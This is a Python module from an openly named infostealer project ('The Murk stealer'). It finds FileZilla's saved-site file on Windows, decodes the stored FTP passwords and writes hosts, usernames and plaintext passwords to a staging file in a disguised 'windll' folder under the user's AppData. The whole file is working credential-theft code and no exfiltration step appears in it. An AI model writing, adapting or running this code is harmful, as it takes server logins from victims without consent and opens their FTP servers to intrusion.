#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
import xml.etree.ElementTree as ET
from base64 import b64decode


def getFilezillaDir():
    system = os.name
    home_dir = os.path.expanduser("~")

    if system == "nt":  
        return os.path.join(home_dir, "AppData", "Roaming", "FileZilla")


def getCredentialsFile():
    return os.path.join(getFilezillaDir(), "sitemanager.xml")


def readCredentialsFile():
    file = getCredentialsFile()
    if not os.path.exists(file):
        pass

    with open(file, "r", encoding="utf-8") as f:
        return f.read()


def readCredentials():
    result = []
    data = ""
    try:
        xml_data = readCredentialsFile()
        preferences = ET.fromstring(xml_data)
    except Exception as e:
        pass

    sites = preferences.findall("Servers/Server")
    if not sites:
        pass

    for site in sites:

        host =site.findtext("Host")
        user = site.findtext("User")
        name = site.findtext("Name")
        user_data = f"""Host: {host}
Username: {user}
Name: {name}
"""
        encoded = site.find("Pass")
        if encoded is not None:
            password = b64decode(encoded.text).decode('utf-8')
            user_data += f"Password: {password}\n"
        result.append(user_data)
    return result

def Grub():
        try:
            credentialsData = readCredentials()
        except:
            credentialsData = None
        finally:
            return credentialsData

def FileZilla() -> None:
    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
    path = rf'{pathtofile}\windll\Files\FileZilla'
    data = Grub()
    with open(rf"{path}\data.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(info) for info in data))

